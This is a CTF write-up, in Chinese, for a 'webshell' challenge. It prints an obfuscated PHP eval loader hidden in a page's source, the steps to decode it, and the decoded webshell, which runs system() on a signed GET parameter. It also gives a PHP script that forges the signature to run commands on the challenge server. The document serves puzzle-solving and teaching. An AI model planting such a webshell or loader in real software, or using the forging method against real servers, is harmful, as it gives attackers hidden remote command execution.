## webshell (100)
Credits to my teammates.
### solution
先檢查原始碼，可以發現原始碼最底部藏了obfuscate過的PHP source code
```php
<?php $cation="St\x72\x5fr\x4ft\x313";
$e_obfus="b\x41Se\x364\x5f\x44e\x43ode";
$e_cod="g\x5ainfl\x41t\x45";
$sourc="St\x72\x72\x45v";
@eval($sourc($e_cod($e_obfus($cation("KMSqn8VjTVKi9lgrcMtH3V
qwT8jvb2vzjiltmKowKNt12dQTxxEDMC99voecmS
H4rKBrpkXVDwmC1yBbi0PV1IeQA0GuTWSr3Pqi3I
qTu92xznWEDw4FxeVNv4JpGewDovk8re57tTcMsM
nk5nVDzzyefSIFS7PQb7AnFMfcg3UBjvl4H/GnPx
/leZxlP/OFJYZ1cqYiHEDvWszvhYHoLnRhvv29gx
cLgJbveVKw5k4jEwAc0VvFAtiPzpZ6BwDnQKOltX
sF+JmSCVPdu0NI3qpr406XpZnKBpfAm+Rjhd9Z00
TUQFagaWJg8qmNQowQCzaUmVaiSlCBLL+VkfuOYe
A8+LkWdkHmDtp9xcmqB6H5OgyaqXK+gpWJTPBuHi
STW8OO9t13k2/7r+He8BfU")))));
```
先把hex string全部轉回character可以得到
```php
$cation="Str_r0t13";
$e_obfus="bASe64_DeCode";
$e_cod="gZinflAtE";
$sourc="StrrEv
```
可以得知是依序對`$cation()`內的字串做`str_rot13`,`base64_decode`,`gzinfalte`,`strrev`
因此可以利用以下方式還原出source code
```php
<?php
echo strrev(gzinflate(base64_decode(str_rot13("KMSqn8VjTVKi9lgrcMtH3V
qwT8jvb2vzjiltmKowKNt12dQTxxEDMC99voecmS
H4rKBrpkXVDwmC1yBbi0PV1IeQA0GuTWSr3Pqi3I
qTu92xznWEDw4FxeVNv4JpGewDovk8re57tTcMsM
nk5nVDzzyefSIFS7PQb7AnFMfcg3UBjvl4H/GnPx
/leZxlP/OFJYZ1cqYiHEDvWszvhYHoLnRhvv29gx
cLgJbveVKw5k4jEwAc0VvFAtiPzpZ6BwDnQKOltX
sF+JmSCVPdu0NI3qpr406XpZnKBpfAm+Rjhd9Z00
TUQFagaWJg8qmNQowQCzaUmVaiSlCBLL+VkfuOYe
A8+LkWdkHmDtp9xcmqB6H5OgyaqXK+gpWJTPBuHi
STW8OO9t13k2/7r+He8BfU"))));
?>
```
而source code為
```php
<?php
function run() {
	if(isset($_GET['cmd']) && isset($_GET['sig'])) {
		$cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd'];
		$key = $_SERVER['HTTP_USER_AGENT'] . sha1($_SERVER['HTTP_HOST']);
		$sig = hash_hmac('SHA512', $cmd, $key);
		if($sig === (string)$_GET['sig']) {
			header('Content-Type: text/plain');
			return !!system($cmd);
		}
	}
	return false
}

function fuck() {
	print(str_repeat("\n", 4096));
	readfile($_SERVER['SCRIPT_FILENAME']);
}

run() ?: fuck(); 
?>
```
若是`run()` return false則會輸出一堆換行然後輸出script本身的內容。

整理上方的限制後我們可以寫出以下script來產生webshell query用的url
```php
<?php
$remote_addr = MY_IP;
$command = 'pwd';
$cmd = hash('SHA512', $remote_addr) ^ $command;
$key = $_SERVER['HTTP_USER_AGENT'] . sha1('webshell.eof-ctf.ais3.ntu.st');
$sig = hash_hmac('SHA512', $command, $key);
$url = "http://webshell.eof-ctf.ais3.ntu.st/?cmd=" . urlencode($cmd) . "&sig=" . urlencode($sig);

echo "URL : <a href=" . $url . ">here</a>"
?>
```
試著`ls -a`會看到`flag`和`.htflag`，`flag`裡面什麼都沒有，而`.htflag`就是真正的flag了
